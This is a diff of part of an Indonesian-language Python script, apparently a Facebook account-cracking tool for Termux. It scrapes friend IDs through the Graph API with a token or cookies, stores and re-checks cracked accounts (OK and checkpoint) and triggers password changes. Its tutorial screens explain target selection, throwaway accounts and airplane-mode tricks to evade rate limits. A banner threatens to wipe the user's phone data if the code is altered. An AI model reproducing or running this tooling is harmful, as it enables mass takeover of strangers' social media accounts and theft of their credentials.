+    tt=[];te=[];lim = _cici_dapunta_('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P));_dapunta_cici_('%s║%s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
+    for x in idi['data']:tt.append(x['id'])
+    for id in tt:
+        try:
+            ada2 = _req_get_('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(id,token));idi2 = _js_lo_(ada2.text)
+            try:
+                for b in idi2['data']:te.append(b['id'])
+            except KeyError:_dapunta_cici_('╠══[!] Private')
+            _dapunta_cici_('╠══[•]',id,'•',len(te));te.clear()
+        except KeyError:_dapunta_cici_('╠══[!] Akun Terkena Spam')
+    _dapunta_cici_('║');_cici_dapunta_('╚══[ Kembali ]');menu()
+
+### Menu Mengecek Hasil Crack
+def hasil():
+    clear()
+    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s1%s] %sCek Hasil OK'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCek Hasil CP'%(O,P,O,P));ch = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+    if ch in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    elif ch in ['1','01','001','a']:
+        try:
+            okl = os.listdir("OK");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Hasil Crack Yang Tersimpan Di File OK %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
+            for file in okl:_dapunta_cici_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
+            _dapunta_cici_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dapunta_cici_('')
+            if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
+            try:
+                ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
+                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sOK%s] %s'%(H,P,H,yyy))
+                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
+            except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
+        except (KeyError,IOError):_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
+    elif ch in ['2','02','002','b']:
+        try:
+            cpl = os.listdir("CP");_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s Hasil Crack Yang Tersimpan Di File CP %s]'%(O,P,O));_dapunta_cici_('%s║'%(O))
+            for file in cpl:_dapunta_cici_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
+            _dapunta_cici_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dapunta_cici_('')
+            if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
+            try:
+                ppp = _dapunta_dapunta_("CP/%s"%(files)).read().splitlines()
+                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sCP%s] %s'%(O,P,O,yyy))
+                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
+            except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
+        except:_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    _dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+
+def cek_hasil():
+    try:os.remove('opsi_dev.txt')
+    except:pass
+    cik = open('opsi_dev.txt','w');cik.write('hasil');cik.close()
+    print('%s╠══[ %sCek Opsi Akun Hasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sContoh File : %s.txt'%(O,P,O,P,tanggal));files__ = _cici_dapunta_('%s╠══[%s•%s] %sFile : '%(O,P,O,P));files = "CP/"+files__
+    try:buka_baju = _dapunta_dapunta_(files,"r").read().splitlines()
+    except FileNotFoundError:_dapunta_cici_("%s╚══[%s!%s] %sFile Tidak Ada"%(M,P,M,P));time.sleep(2); menu()
+    auto_ganti_pass('Ya');_dapunta_cici_("%s╚══[%s•%s] %sJumlah Akun : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
+    for memek in buka_baju:
+        if 'â€¢' in memek:memek = memek.replace('â€¢','•')
+        kontol = memek.replace("•"," • ");titid  = memek.split("•")
+        _format_ = "\r%s[%sCP%s] %s          "%(O,P,O,kontol)
+        try:cek_opsi(titid[0],titid[1],_format_)
+        except:continue
+    _dapunta_cici_("");_dapunta_cici_('%s╔══[%s•%s] %sProses Pengecekan Selesai'%(O,P,O,P));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+
+### Variasi Teks
+def var_menu():
+    _dapunta_cici_('%s╔[ %sPilih Metode Login %s]'%(O,P,O))
+    _dapunta_cici_('%s╠══[%s1%s] %sLogin Dengan Token [%sAkses Terbatas%s]'%(O,P,O,P,O,P))
+    _dapunta_cici_('%s╠══[%s2%s] %sLogin Dengan Cookies [%sAkses Tak Terbatas%s]'%(O,P,O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠[ %sFitur Tanpa Login %s]'%(O,P,O))
+    _dapunta_cici_('%s╠══[%s3%s] %sTutorial Penggunaan Script'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s5%s] %sCek Hasil Crack'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s6%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s0%s] %sKeluar'%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+def var_tutor():
+    mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s1%s] %sCara Mengambil Token'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s2%s] %sCara Mengambil Cookies'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s3%s] %sCara Mendapatkan Target'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s4%s] %sCara Selama Proses Crack'%(O,P,O,P))
+def tutor_target():
+    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
+    mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(O,P,O,P,O))
+    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
+    _dapunta_cici_('%s║'%(O))
+def tutor_crack():
+    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
+    mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(O,P,O,P,O))
+    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
+    _dapunta_cici_('%s║'%(O))
+def var_author():
+    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
+    mlaku('%s║'%(O))
+    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
+    mlaku('%s║     • %sDapunta Khurayra X'%(O,P))
+    mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(O,P))
+    mlaku('%s║'%(O))
+    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
+    mlaku('%s║     • %sAngga Kurniawan'%(O,P))
+    mlaku('%s║     • %sYayan XD'%(O,P))
+    mlaku('%s║     • %sBoy Hamzah'%(O,P))
+    mlaku('%s║     • %sLatip Harkat'%(O,P))
+    mlaku('%s║     • %sZacky Tricker'%(O,P))
+    mlaku('%s║     • %sRizky Dev'%(O,P))
+    mlaku('%s║     • %sIqbal Dev'%(O,P))
+    mlaku('%s║     • %sFallen'%(O,P))
+    mlaku('%s║     • %sHanifan'%(O,P))
+    mlaku('%s║     • %sRizky Leviathan'%(O,P))
+    mlaku('%s║'%(O))
+def var_ugen():
+    _dapunta_cici_("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
+    _dapunta_cici_("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
+    _dapunta_cici_("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
+    _dapunta_cici_("%s╠══[%s4%s] %sHapus User Agent"%(O,P,O,P))
+    _dapunta_cici_("%s╠══[%s5%s] %sCek User Agent"%(O,P,O,P))
+    _dapunta_cici_("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
+def start_method():
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s1%s] %sMetode Api V1'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s2%s] %sMetode Api V2'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s3%s] %sMetode Mbasic V1'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s4%s] %sMetode Mbasic V2'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s5%s] %sMetode Mobile FB V1'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s6%s] %sMetode Mobile FB V2'%(O,P,O,P))
+def start_methodezz():
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s1%s] %sCrack Cepat %s[%sHasil Sedikit%s]'%(O,P,O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s2%s] %sCrack Lambat %s[%sHasil Banyak%s]'%(O,P,O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sHasil Lebih Banyak%s]'%(O,P,O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s4%s] %sCrack Password Gabungan'%(O,P,O,P))
+def started():
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
+    _dapunta_cici_('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
+    _dapunta_cici_('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(O,P,O,P))
+def kata_buat_perecode():
+    clear()
+    _dapunta_cici_('%s╔══[ %sPeringatan/Warning %s]'%(M,P,M))
+    _dapunta_cici_('%s║'%(M))
+    _dapunta_cici_('%s╠══[ %sIndonesia %s]'%(M,P,M))
+    _dapunta_cici_('%s║   • %sAnda Tidak Bisa Mengubah SC Ini'%(M,P))
+    _dapunta_cici_('%s║   • %sTanpa Seizin Author'%(M,P))
+    _dapunta_cici_('%s║   • %sSetelah Peringatan Ini Muncul'%(M,P))
+    _dapunta_cici_('%s║   • %sBerarti Anda Telah Mengubah Isi SC Ini'%(M,P))
+    _dapunta_cici_('%s║   • %sKemudian Data Di HP Anda Akan Terhapus'%(M,P))
+    _dapunta_cici_('%s║   • %sJangan Sekali-Sekali Melanggar Hak Cipta'%(M,P))
+    _dapunta_cici_('%s║   • %sAnda Harus Membeli Lisensi Untuk Premium'%(M,P))
+    _dapunta_cici_('%s║   • %sTidak Ada Yang Gratis'%(M,P))
+    _dapunta_cici_('%s║   • %sStop Recode !!!'%(M,P))
+    _dapunta_cici_('%s║   • %sTerima Kasih'%(M,P))
+    _dapunta_cici_('%s║'%(M))
+    _dapunta_cici_('%s╠══[ %sEnglish %s]'%(M,P,M))
+    _dapunta_cici_("%s║   • %sYou Can't Change This SC"%(M,P))
+    _dapunta_cici_("%s║   • %sWithout Author's Permission"%(M,P))
+    _dapunta_cici_('%s║   • %sAfter This Warning Appears'%(M,P))
+    _dapunta_cici_('%s║   • %sMeans You Have Changed The Contents Of This SC'%(M,P))
+    _dapunta_cici_('%s║   • %sThen The Data On Your Phone Will Be Deleted'%(M,P))
+    _dapunta_cici_('%s║   • %sNever Infringe Copyright'%(M,P))
+    _dapunta_cici_('%s║   • %sNothing is free'%(M,P))
+    _dapunta_cici_('%s║   • %sStop Recode !!!'%(M,P))
+    _dapunta_cici_('%s║   • %sThank You'%(M,P))
+    _dapunta_cici_('%s║'%(M))
+    _dapunta_cici_('%s╚══[ %sRegard Dapunta %s]%s'%(M,P,M,P))
+    _dapunta_cici_('%s'%(P))
+    _cici_cici_()
+
+### Membuat Folder Direktori
+def folder():
+    try:os.mkdir("CP")
+    except:pass
+    try:os.mkdir("OK")
+    except:pass
+
+### Trigger
+if __name__=='__main__':
+    os.system('git pull')
+    clear()
+    folder()
+    menu()
